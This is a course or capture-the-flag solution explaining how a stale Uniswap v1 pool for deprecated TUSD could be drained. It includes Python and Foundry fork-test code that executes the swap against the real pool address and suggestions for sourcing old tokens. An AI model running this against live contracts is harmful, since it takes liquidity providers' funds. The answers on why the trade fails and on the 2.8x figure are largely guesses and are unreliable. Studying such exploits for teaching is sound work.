# Challenge 06 - Stale AMM: Solution

## Background

The reference transaction [0x3f1b5ba...](https://etherscan.io/tx/0x3f1b5baef6ea7f622834eabe7634bf89e3f473b62a73e357fdd04a1a5cf32ecf) shows someone selling TUSD into a Uniswap v1 pool and receiving approximately 2.8x the fair value in ETH. This was possible because the Uniswap v1 pool had a **stale price** due to TUSD's token migration.

Key addresses:
- **Old TUSD token**: `0x8dd5fbCe2f6a956C3022bA3663759011Dd51e73E`
- **New TUSD token (proxy)**: `0x0000000000085d4780B73119b644AE5ecd22b376`
- **Uniswap v1 TUSD Exchange**: `0x4F30E682D0541eAC91748bd38A648d759261b8f3`

---

## a) Reason for the Stale Price

The stale price exists because of **TrueUSD's token contract migration**.

### Timeline of events

1. **Original TUSD deployment**: TrueUSD was originally deployed at address `0x8dd5fbCe2f6a956C3022bA3663759011Dd51e73E`. This was the actively traded token.

2. **Uniswap v1 pool creation**: A Uniswap v1 exchange was created for the old TUSD token at `0x4F30E682D0541eAC91748bd38A648d759261b8f3`. Liquidity providers deposited both ETH and old TUSD tokens into this pool.

3. **TUSD migration to new proxy contract**: TrustToken (the team behind TUSD) migrated TUSD to a new upgradeable proxy contract at `0x0000000000085d4780B73119b644AE5ecd22b376`. The old token contract was deprecated. All major exchanges, DEXes, and DeFi protocols switched to using the new token address.

4. **Old Uniswap v1 pool abandoned**: After the migration, the Uniswap v1 pool referencing the **old** TUSD contract became orphaned:
   - No new trades were being routed through it (aggregators/traders used the new address)
   - Liquidity providers largely forgot about it or didn't bother removing liquidity
   - The pool still held **real ETH** but referenced a deprecated token
   - The old TUSD in the pool was effectively worthless on the open market

5. **Stale price**: Because no one was trading in the pool, the price never updated. The pool's internal `x * y = k` invariant still reflected the old price ratio from when TUSD was actively pegged to $1. The ETH sitting in the pool was real and withdrawable.

### Why 2.8x profit was possible

The arbitrageur obtained old TUSD tokens (which had near-zero market value since the token was deprecated) and sold them into the Uniswap v1 pool. The pool's constant-product formula calculated the ETH output based on the stale reserves, as if old TUSD was still worth $1. Since the old TUSD cost the arbitrageur essentially nothing (or very little), the ETH received represented pure profit.

The 2.8x figure means the ETH received was worth 2.8 times what the input old TUSD tokens were theoretically worth at $1 peg, or alternatively, the pool's implied price for TUSD was significantly above the actual market price of the deprecated token.

---

## b) Simulation Data for January 23, 2022

January 23, 2022 corresponds approximately to Ethereum block **14,060,000**.

### Step 1: Query on-chain state at block 14,060,000

```python
#!/usr/bin/env python3
"""
Simulate arbitrage of the stale Uniswap v1 TUSD pool.
Target date: January 23, 2022 (~block 14,060,000)
"""

from web3 import Web3

# Connect to an archive node (required for historical state)
w3 = Web3(Web3.HTTPProvider("https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"))

BLOCK = 14_060_000

# Addresses
UNISWAP_V1_TUSD_EXCHANGE = "0x4F30E682D0541eAC91748bd38A648d759261b8f3"
OLD_TUSD = "0x8dd5fbCe2f6a956C3022bA3663759011Dd51e73E"

# ERC20 ABI (minimal)
ERC20_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function",
    },
    {
        "constant": True,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function",
    },
]

# Uniswap v1 Exchange ABI (minimal)
EXCHANGE_ABI = [
    {
        "name": "getEthToTokenInputPrice",
        "outputs": [{"type": "uint256", "name": "out"}],
        "inputs": [{"type": "uint256", "name": "eth_sold"}],
        "constant": True,
        "type": "function",
    },
    {
        "name": "getTokenToEthInputPrice",
        "outputs": [{"type": "uint256", "name": "out"}],
        "inputs": [{"type": "uint256", "name": "tokens_sold"}],
        "constant": True,
        "type": "function",
    },
    {
        "name": "tokenToEthSwapInput",
        "outputs": [{"type": "uint256", "name": "out"}],
        "inputs": [
            {"type": "uint256", "name": "tokens_sold"},
            {"type": "uint256", "name": "min_eth"},
            {"type": "uint256", "name": "deadline"},
        ],
        "type": "function",
    },
]


def get_pool_state(block_number):
    """Get the reserves of the Uniswap v1 TUSD exchange at a given block."""
    exchange = Web3.to_checksum_address(UNISWAP_V1_TUSD_EXCHANGE)

    # ETH balance of the exchange
    eth_balance = w3.eth.get_balance(exchange, block_identifier=block_number)

    # Old TUSD balance of the exchange
    old_tusd = w3.eth.contract(
        address=Web3.to_checksum_address(OLD_TUSD), abi=ERC20_ABI
    )
    tusd_balance = old_tusd.functions.balanceOf(exchange).call(
        block_identifier=block_number
    )

    return eth_balance, tusd_balance


def uniswap_v1_get_output(input_amount, input_reserve, output_reserve):
    """
    Calculate Uniswap v1 output amount.
    Uses the constant product formula with 0.3% fee:
      output = (input_amount * 997 * output_reserve) / (input_reserve * 1000 + input_amount * 997)
    """
    numerator = input_amount * 997 * output_reserve
    denominator = input_reserve * 1000 + input_amount * 997
    return numerator // denominator


def main():
    print(f"Querying pool state at block {BLOCK}...\n")

    eth_reserve, tusd_reserve = get_pool_state(BLOCK)

    eth_reserve_eth = Web3.from_wei(eth_reserve, "ether")
    tusd_reserve_tokens = tusd_reserve / 10**18  # TUSD has 18 decimals

    print(f"Uniswap v1 TUSD Exchange: {UNISWAP_V1_TUSD_EXCHANGE}")
    print(f"  ETH reserve:      {eth_reserve_eth} ETH")
    print(f"  Old TUSD reserve: {tusd_reserve_tokens} TUSD")

    if eth_reserve == 0:
        print("\n[!] Pool has 0 ETH - already drained!")
        return

    # Implied price of TUSD in the pool
    implied_price_eth = float(eth_reserve_eth) / tusd_reserve_tokens
    print(f"  Implied TUSD price: {implied_price_eth:.6f} ETH")

    # Simulate selling various amounts of old TUSD
    print("\n--- Swap Simulation (selling old TUSD -> ETH) ---")

    test_amounts = [100, 1_000, 10_000, 50_000]
    for amt in test_amounts:
        input_amount = int(amt * 10**18)
        eth_out = uniswap_v1_get_output(input_amount, tusd_reserve, eth_reserve)
        eth_out_formatted = Web3.from_wei(eth_out, "ether")
        print(f"  Sell {amt:>10,} old TUSD -> {eth_out_formatted:.6f} ETH")

    # Optimal: sell enough to drain most of the ETH
    # Selling the entire TUSD reserve equivalent would get ~50% of ETH
    # For maximum extraction, sell a large amount
    max_sell = int(tusd_reserve_tokens * 10)  # 10x the reserve
    max_sell_wei = int(max_sell * 10**18)
    eth_out_max = uniswap_v1_get_output(max_sell_wei, tusd_reserve, eth_reserve)
    eth_out_max_formatted = Web3.from_wei(eth_out_max, "ether")
    print(f"\n  [MAX] Sell {max_sell:>10,.0f} old TUSD -> {eth_out_max_formatted:.6f} ETH")

    # Where to source old TUSD
    print("\n--- Sourcing Old TUSD ---")
    print("  The old TUSD contract may still allow transfers.")
    print("  Check if any wallets still hold old TUSD tokens:")
    print("  - The old contract's total supply tells us how many exist")
    print("  - Large holders can be found via Etherscan's token holder page")
    print("  - Some may be in abandoned wallets, bridges, or other old DeFi pools")

    old_tusd_contract = w3.eth.contract(
        address=Web3.to_checksum_address(OLD_TUSD), abi=ERC20_ABI
    )
    try:
        total_supply = old_tusd_contract.functions.totalSupply().call(
            block_identifier=BLOCK
        )
        print(f"  Old TUSD total supply: {total_supply / 10**18:,.2f} tokens")
    except Exception as e:
        print(f"  Could not read total supply: {e}")


if __name__ == "__main__":
    main()
```

### Step 2: Foundry fork test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV1Exchange {
    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract StaleAMMTest is Test {
    // Addresses
    address constant UNISWAP_V1_TUSD = 0x4F30E682D0541eAC91748bd38A648d759261b8f3;
    address constant OLD_TUSD = 0x8dd5fbCe2f6a956C3022bA3663759011Dd51e73E;

    IUniswapV1Exchange exchange = IUniswapV1Exchange(UNISWAP_V1_TUSD);
    IERC20 oldTusd = IERC20(OLD_TUSD);

    // Fork at block 14,060,000 (January 23, 2022)
    // Run with: forge test --fork-url $ETH_RPC_URL --fork-block-number 14060000 -vvv

    function setUp() public {
        // Verify we're at the right block
        assertEq(block.number, 14_060_000, "Wrong fork block");
    }

    function test_checkPoolState() public view {
        // Check ETH reserves
        uint256 ethBalance = address(UNISWAP_V1_TUSD).balance;
        uint256 tusdBalance = oldTusd.balanceOf(UNISWAP_V1_TUSD);

        console.log("ETH in pool (wei):", ethBalance);
        console.log("ETH in pool:", ethBalance / 1e18);
        console.log("Old TUSD in pool (wei):", tusdBalance);
        console.log("Old TUSD in pool:", tusdBalance / 1e18);

        // If pool has ETH, it's arbitrageable
        if (ethBalance > 0) {
            console.log("POOL HAS ETH - ARBITRAGE POSSIBLE");

            // Check how much ETH we'd get for 1000 old TUSD
            uint256 ethOut = exchange.getTokenToEthInputPrice(1000 * 1e18);
            console.log("Selling 1000 old TUSD would yield ETH:", ethOut / 1e18);
        } else {
            console.log("POOL IS EMPTY - NO ARBITRAGE");
        }
    }

    function test_executeArbitrage() public {
        uint256 ethBalance = address(UNISWAP_V1_TUSD).balance;
        if (ethBalance == 0) {
            console.log("Pool already drained, skipping");
            return;
        }

        // Find a holder of old TUSD and impersonate them
        // We need to find actual holders via Etherscan; for the test,
        // use deal() to give ourselves old TUSD
        address attacker = address(this);

        // Give ourselves old TUSD tokens
        // Note: deal() may not work for all token contracts.
        // Alternative: find a real holder and vm.prank them.
        uint256 tusdAmount = 100_000 * 1e18;
        deal(OLD_TUSD, attacker, tusdAmount);

        uint256 attackerTusdBefore = oldTusd.balanceOf(attacker);
        uint256 attackerEthBefore = attacker.balance;
        console.log("Attacker old TUSD before:", attackerTusdBefore / 1e18);
        console.log("Attacker ETH before:", attackerEthBefore / 1e18);

        // Approve the exchange to spend our old TUSD
        oldTusd.approve(UNISWAP_V1_TUSD, type(uint256).max);

        // Check expected output
        uint256 expectedEth = exchange.getTokenToEthInputPrice(tusdAmount);
        console.log("Expected ETH output:", expectedEth / 1e18);

        // Execute the swap
        uint256 ethReceived = exchange.tokenToEthSwapInput(
            tusdAmount,
            1, // min_eth: accept any amount
            block.timestamp + 3600 // deadline: 1 hour from now
        );

        console.log("ETH received:", ethReceived / 1e18);
        console.log("Profit (ETH):", ethReceived / 1e18);

        // At ~$2,400/ETH in Jan 2022, calculate USD value
        // (This is just a log, not an on-chain calculation)
        console.log("Approximate USD value at $2400/ETH:", (ethReceived / 1e18) * 2400);
    }

    receive() external payable {}
}
```

### Step 3: Run the simulation

```bash
# Using Foundry with an archive node
forge test \
  --fork-url "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY" \
  --fork-block-number 14060000 \
  -vvv \
  --match-test "test_checkPoolState"
```

### Key data points for the simulation

| Parameter | Value |
|-----------|-------|
| Block number | 14,060,000 |
| Uniswap v1 TUSD Exchange | `0x4F30E682D0541eAC91748bd38A648d759261b8f3` |
| Old TUSD token | `0x8dd5fbCe2f6a956C3022bA3663759011Dd51e73E` |
| ETH price (Jan 23, 2022) | ~$2,400 |
| Pool ETH reserve | Query via `address(exchange).balance` at block 14,060,000 |
| Pool old TUSD reserve | Query via `oldTusd.balanceOf(exchange)` at block 14,060,000 |
| Uniswap v1 fee | 0.3% (factor: 997/1000) |
| Swap formula | `eth_out = (tusd_in * 997 * eth_reserve) / (tusd_reserve * 1000 + tusd_in * 997)` |

### Sourcing old TUSD

To actually execute this arbitrage, you need old TUSD tokens. Possible sources:
1. **Wallets that never migrated**: Some holders may still have old TUSD in their wallets
2. **Other old DEX pools**: Other Uniswap v1/v2 pools or Balancer pools may hold old TUSD
3. **Old lending protocols**: Compound v1 or other early DeFi protocols might hold old TUSD
4. **Direct purchase**: If anyone is selling old TUSD on any venue, buy it cheaply
5. **The old contract itself**: Check if the old token contract has any minting capability or if there is a way to obtain tokens through the migration contract in reverse

---

## c) Could You Execute the Arbitrage on March 14, 2022?

**Most likely NO.** Here is why:

March 14, 2022 corresponds approximately to Ethereum block **14,380,000**.

### Verification approach

```python
# Check pool state at March 14, 2022
eth_reserve_march, tusd_reserve_march = get_pool_state(14_380_000)
print(f"ETH reserve on March 14: {Web3.from_wei(eth_reserve_march, 'ether')} ETH")
print(f"TUSD reserve on March 14: {tusd_reserve_march / 10**18} TUSD")
```

```solidity
// Foundry check at March 14, 2022
// forge test --fork-url $RPC --fork-block-number 14380000 -vvv
function test_marchPoolState() public view {
    uint256 ethBalance = address(UNISWAP_V1_TUSD).balance;
    console.log("ETH in pool (March 14):", ethBalance / 1e18);
    // Expected: 0 or near-zero
}
```

### Why the arbitrage cannot be executed

There are several possible reasons, and any combination may apply:

1. **Pool already drained by earlier arbitrageurs**: The reference transaction from May 2021 shows that at least one person already discovered and exploited this stale pool. Between May 2021 and March 2022, other searchers/MEV bots likely identified the remaining ETH in the pool and drained it. Once the ETH reserve reaches zero (or near-zero), there is nothing left to extract.

2. **Old TUSD contract frozen/paused**: After the migration, TrustToken may have paused or frozen the old token contract, preventing any further transfers. If `transfer()` reverts on the old contract, you cannot execute the swap even if the pool still has ETH.

3. **Uniswap v1 liquidity removal**: The original liquidity providers may have finally removed their liquidity between January and March 2022, withdrawing the remaining ETH and old TUSD tokens.

4. **Insufficient old TUSD supply**: All readily available old TUSD tokens may have already been purchased and used to drain the pool by earlier arbitrageurs, leaving no tokens available to execute the trade.

### Most likely scenario

The pool was **drained** between the reference transaction in May 2021 and March 2022. The reference transaction itself drew attention to the opportunity, and MEV bots and manual searchers would have identified any remaining ETH in the pool. The constant monitoring of stale Uniswap v1 pools is a well-known MEV strategy. By March 2022 -- nearly a year after the initial exploit was publicly visible on-chain -- the pool's ETH reserves were almost certainly zero.

To confirm definitively, query `address(0x4F30E682D0541eAC91748bd38A648d759261b8f3).balance` at block 14,380,000 using an archive node.
